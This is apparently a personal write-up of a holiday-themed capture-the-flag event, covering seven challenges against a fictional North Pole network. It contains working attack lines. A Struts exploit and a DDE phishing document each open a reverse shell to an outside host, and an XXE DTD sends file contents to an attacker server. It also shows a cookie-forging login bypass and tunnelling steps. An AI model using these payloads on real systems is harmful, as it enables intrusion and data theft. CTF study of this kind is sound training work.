#CTF Main Challenges
This is a rough write of my notes while completing the challenge, he offical report is under Final Writeup section.

##Challenge - 1 
Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. 
What is the title of that page?

Solved in Terminal Challenge 1 
My name is Bushy Evergreen, and I have a problem for you.I think a server got owned, and I can only offer a clue.We use the system for chat, to keep toy production running.Can you help us recover from the server connection shunning?

Find and run the elftalkd binary to complete this challenge.


##Challenge - 2 Apache Struts
Investigate the Letters to Santa application at  https://l2s.northpolechristmastown.com.
What is the topic of The Great Book page available in the web root of the server
On the Topic of Flying Animals

What is Alabaster Snowball's password?

```stream_unhappy_buy_loss```

In Source Code of https://l2s.northpolechristmastown.com, found link to :
https://dev.northpolechristmastown.com/orders.xhtml running apache struts
https://github.com/mazen160/struts-pwn_CVE-2017-9805

 
```python struts-pwn.py --url 	'https://dev.northpolechristmastown.com/orders'```

Then Used https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code 
from Hint which points to this tool to encode https://raw.githubusercontent.com/chrisjd20/cve-2017-9805.py/master/cve-2017-9805.py
downloaded python and used to send bash reverse shell 

```bash -i >& /dev/tcp/54.202.232.184/80 0>&1"```
```python cve-2017-9805.py -u  'https://dev.northpolechristmastown.com/orders/' -c  "bash -i >& /dev/tcp/54.202.232.184/80 0>&1"```

Success! got reverse shell on AWS instance


In Reverse shell went to `````/var/www/`````
found GreatBookPage2.pdf
https://l2s.northpolechristmastown.com/GreatBookPage2.pdf

Pillaged to find dev files with password 

```ll -l /*/*```
searched for files owned by alabaster_snowballfound a few interested files but one matched the 'dev' hint.
```/dev/shm:file``` in that directory called test1.txtcat test1.txt 

Within that file a reference to a SQL :

```file/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:3:           
final String username = "alabaster_snowball";
cat alabaster_snowball@l2s:/dev/shm$ 
cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class            
final String username = "alabaster_snowball";            
final String password = "stream_unhappy_buy_loss";
```
Tried the creds and logged into SSH:
```ssh alabaster_snowball@35.227.95.239```

confirmed password with successful login!

##Challenge 3 -SMB

The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. 
Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. 
hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)

What is the file server share name?
FileStor

For hints, please see Holly Evergreen in the Cryokinetic Magic Level.


From ec2 instance and tunneling through Letters to Santa :

```ssh -C -D 1080 alabaster_snowball@35.227.95.239```

Did some recon:
```nmap 10.142.0.0/24 -sn```
didnt reveal the SMB server

```nmap 10.142.0.0/24  -PS445 (HINT from Holly Evergreen)```

revealed a new IP of 10.142.0.7 with 445 open 

hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)

```proxychains smbclient -L 10.142.0.7 -U alabaster_snowball```


```Enter WORKGROUP\alabaster_snowball's password: 
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
FileStor        Disk      
IPC$            IPC       Remote IPC

Reconnecting with SMB1 for workgroup listing.
```

FileShare name is FileStor

```proxychains smbclient \\\\10.142.0.7\\FileStor -U alabaster_snowball```

From there was able to get GreatBookPage3.pdf

##Challenge 4 - Mail Cookie
Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. 
What can you learn from The Great Book page found in an e-mail on that server?
Find a NPC conversation with Bumble and SAM. Abominable Snow Monster is throwing snowballs.
Rise of the Lollipop Guild – Group of spys working to undermine Elves

Pepper Minstix provides some hints for this challenge on the There's Snow Place Like Home Level.

From EC2 Kali Instance:
```ssh -C -D 1080 alabaster_snowball@35.227.95.239```

Used proxychains again to setup a tunnel and broswer through Firefox
```
nano /etc/proxychains.conf
make sure it set to 1080
proxychains firefox
```

Recon on the website:

mail.northpolechristmastown.com (10.142.0.5)
```
http://10.142.0.5/robots.txt
http://10.142.0.5/cookie.txt
http://10.142.0.5/orders.xhtml
```
alabaster.snowball@northpolechristmastown.com

Found site to encrpt to AES256 and used https://aesencryption.net/

Create AES256 string using
``
string: thisistheencrypt
Key:1234
AES256: y0MBQ642b8EM5psdSpS03Q==
``

final cookie should look like this
```
{"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"","ciphertext":"y0MBQ642b8EM5psdSpS03Q=="}
```

Found email with Greatbook page from holly Everygreen
```
f192a884f68af24ae55d9d9ad4adf8d3a3995258  
```

##Challenge 5 - JSON
How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? 
4 infractions

What are the names of at least six insider threat moles?
Filter data for hair pulling, rock throwing, wedgy giving
Nina, Bini, Sheri, Wesley, Kristy, Boq

Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?
Infractions for rock throwing were Bini and Boq

To Solve:

Go to website https://nppd.northpolechristmastown.com/infractions?query=name%3A*

Craft request to returns all of the names (status:*)

Used https://json-csv.com/ to convert json to csv

Analyze the names and compare to document taken from challenge 3 smb server
naughty and nice list.csv

Looked at BOLO-MunchkinMoleReport.docx taken from smb server and see that all moles were charged with 'aggravated hair pulling' and search for term 'hair pulling' in list of names taken from NPPD site


##Challenge 6 - XXE
6The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. 
Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. 

Then retrieve The Great Book PDF file by following those directions. 
What is the title of The Great Book page?

The Dreaded Inter-Dimensional Tornadoes

To Solve:
```
ssh -C -D 1080 alabaster_snowball@35.196.147.148
proxychains firefox
http://10.142.0.13
http://10.142.0.13/XMLFile/Elfdata.xml
```
downloaded the example xml:
http://10.142.0.13/Home/DisplayXML
http://10.142.0.13/Home/CreateElfs

Use the Elfdata.xml give to inject XXE to get file and Create Evil.dtd:
```
<?xml version="1.0" encoding="UTF-8"?><!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt"><!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://54.202.232.184:80/?%stolendata;'>">
Add into Elfdata.xml the XEE payload 
<!DOCTYPE demo [<!ELEMENT demo ANY >ENTITY % extentity SYSTEM "http://54.202.232.184:80/evil.dtd">%extentity;%inception;%sendit;]>
```

Upload the edited Elfdata.xml to site

On EC2 start simple python server:
```
python -m SimpleHTTPServer 80
```
In response we get:
```
35.185.118.225 - - [18/Dec/2017 14:57:13] "GET /evil.dtd HTTP/1.1" 200 -
35.185.118.225 - - [18/Dec/2017 14:57:13] "GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1" 200 -
```
Now we know locate of the greatbook6.pdf
Visit the website at http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf 

Download the Greatbook6.pdf 

##Challenge 7 - Phishin
Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. 

Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. 
Retrieve The Great Book page from C:\GreatBookPage7.pdf. 

What does The Great Book page describe?
Regarding the Witches of Oz


To Solve:
```
SSH -C -D 1080 alabaster_snowball@35.196.147.148
```
setup browser to proxy traffic through 127.0.0.1 1080 socks proxy

Visit site EWS site at http://10.142.0.5/account.html

Use cookie login bypass method from Challenge 4

Login  as jessica.claus@northpolechristmastown.com and write email to alabaster.snowball@northpolechristmastown.com
create a new docx with the following formula:
```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k nc 10.142.0.11 10443 -e cmd.exe"}
```
Attach docx to email 
start listener on server you just sshed tunnelled into 
```
nc -lvp 10443
```
send email
Get CMD reverse shell!

Now you can go to directory C:\ to find GreatBookPage7.pdf

Start netcat listners on EMI server that servers up file
```
C:\>nc-lvp 9999 < GreatBookPage7.pdf
```
Proxychain from my host kali through the SSH tunnel to new listener on EMI server to download file locally :
```
proxychains nc 10.142.0.8 9999 > GreatBookPage7.pdf
```
Grabbed File and ran a shasum on it to get:
```
8b887dcc477fdd544ca84b874285283046adb720
C1DF4DBC96A58B48A9F235A1CA89352F865AF8B8
```

BUT Shasums were wrong

Had to reopened GreatBookPage7.pdf in text editor and found that the proxychains added in a line, which through off shasum
saved and re-executed shasum to get correct value
```
c1df4dbc96a58b48a9f235a1ca89352f865af8b8
```

